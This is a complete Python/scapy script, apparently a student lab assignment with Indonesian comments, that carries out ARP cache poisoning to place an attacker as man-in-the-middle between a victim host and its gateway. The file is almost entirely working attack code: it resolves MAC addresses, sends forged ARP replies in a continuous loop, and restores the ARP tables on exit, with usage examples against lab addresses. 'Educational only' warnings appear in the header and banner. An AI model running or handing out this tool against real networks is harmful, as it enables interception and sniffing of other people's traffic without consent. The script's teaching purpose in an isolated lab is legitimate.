#!/usr/bin/env python3
"""
ARP Spoofing Attack Script
===========================
Tugas Kelompok 5 - Network Programming & Administration

Simulasi serangan ARP Cache Poisoning (MITRE ATT&CK: T1557.002)
untuk mendapatkan posisi Man-in-the-Middle (T1557) antara victim dan gateway.

⚠️  PERINGATAN: Script ini HANYA untuk tujuan EDUKASI dalam lingkungan lab terisolasi.
    Penggunaan di jaringan tanpa izin adalah ILEGAL.

Cara Kerja:
1. Mengirim paket ARP Reply palsu ke victim, mengklaim sebagai gateway
2. Mengirim paket ARP Reply palsu ke gateway, mengklaim sebagai victim
3. Traffic antara victim dan gateway akan melewati mesin attacker
4. Attacker dapat melakukan sniffing terhadap traffic yang melewati

Referensi:
- MITRE ATT&CK T1557.002: ARP Cache Poisoning
- OWASP A04:2025: Cryptographic Failures
"""

import sys
import time
import signal
import argparse
from scapy.all import Ether, ARP, sendp, srp, get_if_addr, conf
from colorama import init, Fore, Style

init(autoreset=True)

# Banner
BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
║              ARP SPOOFING ATTACK TOOL                        ║
║         Network Programming & Administration Lab             ║
║                                                              ║
║  ⚠️  FOR EDUCATIONAL PURPOSES ONLY                            ║
║  MITRE ATT&CK: T1557.002 (ARP Cache Poisoning)              ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface=None):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface or conf.iface
        self.target_mac = None
        self.gateway_mac = None
        self.attacker_mac = Ether().src
        self.packets_sent = 0
        self.running = False
    
    def get_mac(self, ip):
        """Mendapatkan MAC address dari IP menggunakan ARP request"""
        print(f"{Fore.CYAN}[*] Mencari MAC address untuk {ip}...{Style.RESET_ALL}")
        
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        answered, _ = srp(arp_request, timeout=3, verbose=False, iface=self.interface)
        
        if answered:
            mac = answered[0][1].hwsrc
            print(f"{Fore.GREEN}[+] MAC address {ip}: {mac}{Style.RESET_ALL}")
            return mac
        else:
            print(f"{Fore.RED}[-] Tidak dapat menemukan MAC address untuk {ip}{Style.RESET_ALL}")
            sys.exit(1)
    
    def spoof(self, target_ip, target_mac, spoof_ip):
        """
        Mengirim paket ARP Reply palsu
        
        Membuat target percaya bahwa IP spoof_ip memiliki MAC address attacker.
        Ini menyebabkan traffic yang ditujukan ke spoof_ip akan dikirim ke attacker.
        
        Args:
            target_ip: IP korban yang ARP cache-nya akan diracuni
            target_mac: MAC address korban
            spoof_ip: IP yang akan di-impersonate (biasanya gateway)
        """
        # Buat paket ARP Reply palsu
        packet = Ether(dst=target_mac) / ARP(
            op=2,           # ARP Reply (is-at)
            pdst=target_ip,  # Target IP (korban)
            hwdst=target_mac, # Target MAC (korban)
            psrc=spoof_ip    # IP yang di-spoof (gateway)
            # hwsrc otomatis diisi dengan MAC attacker
        )
        
        sendp(packet, verbose=False, iface=self.interface)
    
    def restore(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """
        Mengembalikan ARP table ke kondisi normal
        
        Mengirim ARP Reply yang benar agar traffic kembali normal.
        """
        print(f"\n{Fore.YELLOW}[*] Mengembalikan ARP table...{Style.RESET_ALL}")
        
        # Kirim paket ARP yang benar beberapa kali untuk memastikan
        for _ in range(5):
            # Kembalikan ARP cache victim
            packet1 = Ether(dst=target_mac) / ARP(
                op=2, pdst=target_ip, hwdst=target_mac,
                psrc=gateway_ip, hwsrc=gateway_mac
            )
            # Kembalikan ARP cache gateway
            packet2 = Ether(dst=gateway_mac) / ARP(
                op=2, pdst=gateway_ip, hwdst=gateway_mac,
                psrc=target_ip, hwsrc=target_mac
            )
            sendp(packet1, verbose=False, iface=self.interface)
            sendp(packet2, verbose=False, iface=self.interface)
            time.sleep(0.5)
        
        print(f"{Fore.GREEN}[+] ARP table berhasil dikembalikan!{Style.RESET_ALL}")
    
    def start(self):
        """Mulai serangan ARP Spoofing"""
        print(BANNER)
        
        print(f"{Fore.CYAN}[*] Interface: {self.interface}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Attacker MAC: {self.attacker_mac}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target IP: {self.target_ip}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Gateway IP: {self.gateway_ip}{Style.RESET_ALL}")
        print()
        
        # Dapatkan MAC address target dan gateway
        self.target_mac = self.get_mac(self.target_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)
        
        print(f"\n{Fore.RED}[!] Memulai ARP Spoofing...{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] Tekan Ctrl+C untuk menghentikan serangan{Style.RESET_ALL}\n")
        
        self.running = True
        
        # Handle Ctrl+C untuk cleanup
        def signal_handler(sig, frame):
            self.running = False
            self.restore(self.target_ip, self.target_mac, 
                        self.gateway_ip, self.gateway_mac)
            print(f"\n{Fore.GREEN}[+] Total paket terkirim: {self.packets_sent}{Style.RESET_ALL}")
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        
        try:
            while self.running:
                # Spoof victim: "Saya adalah gateway"
                self.spoof(self.target_ip, self.target_mac, self.gateway_ip)
                
                # Spoof gateway: "Saya adalah victim"
                self.spoof(self.gateway_ip, self.gateway_mac, self.target_ip)
                
                self.packets_sent += 2
                
                # Status update
                print(f"\r{Fore.YELLOW}[*] Paket terkirim: {self.packets_sent} "
                      f"| Target: {self.target_ip} ({self.target_mac}) "
                      f"| Gateway: {self.gateway_ip} ({self.gateway_mac}){Style.RESET_ALL}", 
                      end="", flush=True)
                
                time.sleep(1)  # Interval pengiriman
                
        except KeyboardInterrupt:
            self.running = False
            self.restore(self.target_ip, self.target_mac, 
                        self.gateway_ip, self.gateway_mac)
            print(f"\n{Fore.GREEN}[+] Total paket terkirim: {self.packets_sent}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        description="ARP Spoofing Attack Tool - Educational Purpose Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Contoh Penggunaan:
  # Spoofing antara victim (172.20.0.2) dan gateway (172.20.0.1)
  python arp_spoof.py -t 172.20.0.2 -g 172.20.0.1

  # Dengan interface spesifik
  python arp_spoof.py -t 172.20.0.2 -g 172.20.0.1 -i eth0

MITRE ATT&CK Reference:
  T1557     - Adversary-in-the-Middle
  T1557.002 - ARP Cache Poisoning
  T1040     - Network Sniffing
        """
    )
    
    parser.add_argument("-t", "--target", required=True,
                       help="IP address target/victim")
    parser.add_argument("-g", "--gateway", required=True,
                       help="IP address gateway")
    parser.add_argument("-i", "--interface", default=None,
                       help="Network interface (default: auto-detect)")
    
    args = parser.parse_args()
    
    spoofer = ARPSpoofer(args.target, args.gateway, args.interface)
    spoofer.start()


if __name__ == "__main__":
    main()
